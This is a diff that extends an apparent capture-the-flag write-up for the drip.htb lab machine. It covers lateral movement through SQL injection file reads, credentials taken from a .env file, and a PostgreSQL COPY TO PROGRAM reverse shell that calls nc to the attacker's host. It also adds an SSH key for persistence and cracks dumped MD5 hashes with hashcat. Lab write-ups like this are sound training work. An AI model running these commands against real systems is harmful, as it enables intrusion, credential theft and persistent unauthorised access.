@@ -191,7 +191,21 @@ http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aMT8tg.jgx5a6ktRvXvrWoy
 
 The search function at `/analytics` is vulnerable to SQL injection with a simple `''; <command>;` injection vector
 
-#### Reading `/etc/passwd`
+#### `/etc/hosts`
+
+```
+127.0.0.1       localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
+172.16.20.3 drip.darkcorp.htb
+```
+
+#### `/etc/passwd`
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -230,6 +244,8 @@ _chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
 ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
 ```
 
+#### Find credential
+
 Reading a PostgreSQL log file with `''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0, 10000000);` reveals password hash for `ebelford`
 
 ```
@@ -252,4 +268,159 @@ Hash.Target......: 8bbd7f88841b4223ae63c8848969be86
 ⋮
 ```
 
-Credential discovered: `ebelford`/`ThePlague61780`
+Credential found: `ebelford`/`ThePlague61780`
+
+## 3. Lateral movement
+
+SSH to target with `ebelford`:
+
+```console
+root@kali:~# sshpass -pThePlague61780 ssh -o StrictHostKeyChecking=no ebelford@drip.htb
+⋮
+
+ebelford@drip:~$ id
+uid=1002(ebelford) gid=1002(ebelford) groups=1002(ebelford)
+```
+
+### 3.1. Move to PostgreSQL user
+
+#### Find credential
+
+Database credential found at `/var/www/html/dashboard/.env`:
+
+```sh
+# True for development, False for production
+DEBUG=False
+
+# Flask ENV
+FLASK_APP=run.py
+FLASK_ENV=development
+
+# If not provided, a random one is generated
+# SECRET_KEY=<YOUR_SUPER_KEY_HERE>
+
+# Used for CDN (in production)
+# No Slash at the end
+ASSETS_ROOT=/static/assets
+
+# If DB credentials (if NOT provided, or wrong values SQLite is used)
+DB_ENGINE=postgresql
+DB_HOST=localhost
+DB_NAME=dripmail
+DB_USERNAME=dripmail_dba
+DB_PASS=2Qa2SsBkQvsc
+DB_PORT=5432
+
+SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
+SQLALCHEMY_TRACK_MODIFICATIONS = True
+SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
+MAIL_SERVER = 'drip.htb'
+MAIL_PORT = 25
+MAIL_USE_TLS = False
+MAIL_USE_SSL = False
+MAIL_USERNAME = None
+MAIL_PASSWORD = None
+MAIL_DEFAULT_SENDER = 'support@drip.htb'
+```
+
+Credential found: `dripmail_dba`/`2Qa2SsBkQvsc`
+
+#### Get reverse shell
+
+Start listener on kali: `rlwrap nc -nlvp 4444`
+
+Execute PostgreSQL reverse shell connection:
+
+```sh
+PGPASSWORD=2Qa2SsBkQvsc psql -h localhost -U dripmail_dba -d dripmail -c "COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.3 4444 >/tmp/f'"
+```
+
+Reverse shell hooked as `postgres`:
+
+```console
+connect to [10.10.14.3] from (UNKNOWN) [10.10.11.54] 54984
+bash: cannot set terminal process group (152044): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@drip:/var/lib/postgresql/15/main$ id
+id
+uid=102(postgres) gid=110(postgres) groups=110(postgres),109(ssl-cert)
+```
+
+#### Persist access with `postgres`
+
+Add SSH key:
+
+```sh
+mkdir -p ~/.ssh && echo 'ssh-ed25519 <user-ssh-public-key>' >> ~/.ssh/authorized_keys
+```
+
+SSH as `postgres`:
+
+```console
+root@kali:~# ssh -i id_ed25519 postgres@drip.htb
+⋮
+
+postgres@drip:~$ id
+uid=102(postgres) gid=110(postgres) groups=110(postgres),109(ssl-cert)
+```
+
+### 3.2. Find more credentials
+
+Find encrypted PostgreSQL backup:
+
+```console
+postgres@drip:~$ ls -la /var/backups/postgres/
+total 20
+drwx------ 2 postgres postgres 4096 Sep 13 04:08 .
+drwxr-xr-x 3 root     root     4096 Sep 13 00:00 ..
+-rw-r--r-- 1 postgres postgres 4774 Sep 13 04:08 dev-dripmail.old.sql
+-rw-r--r-- 1 postgres postgres 1784 Feb  5  2025 dev-dripmail.old.sql.gpg
+```
+
+Decrypt backup with `dripmail_dba` password:
+
+```console
+postgres@drip:~$ gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > dev-dripmail.old.sql
+gpg: encrypted with 3072-bit RSA key, ID 1112336661D8BC1F, created 2025-01-08
+      "postgres <postgres@drip.darkcorp.htb>"
+```
+
+Extract users and hashes from decrypted file:
+
+```console
+postgres@drip:~$ cat /var/backups/postgres/dev-dripmail.old.sql
+--
+-- PostgreSQL database dump
+--
+
+-- Dumped from database version 15.10 (Debian 15.10-0+deb12u1)
+-- Dumped by pg_dump version 15.10 (Debian 15.10-0+deb12u1)
+⋮
+
+COPY public."Admins" (id, username, password, email) FROM stdin;
+1       bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb
+2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
+3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
+⋮
+
+```
+
+Crack password hashes with hashcat:
+
+```console
+root@kali:~# hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+⋮
+
+cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#
+8bbd7f88841b4223ae63c8848969be86:ThePlague61780
+Approaching final keyspace - workload adjusted.
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 0 (MD5)
+Hash.Target......: hashes.txt
+⋮
+```
+
+Credential found: `victor.r`/`victor1gustavo@#`
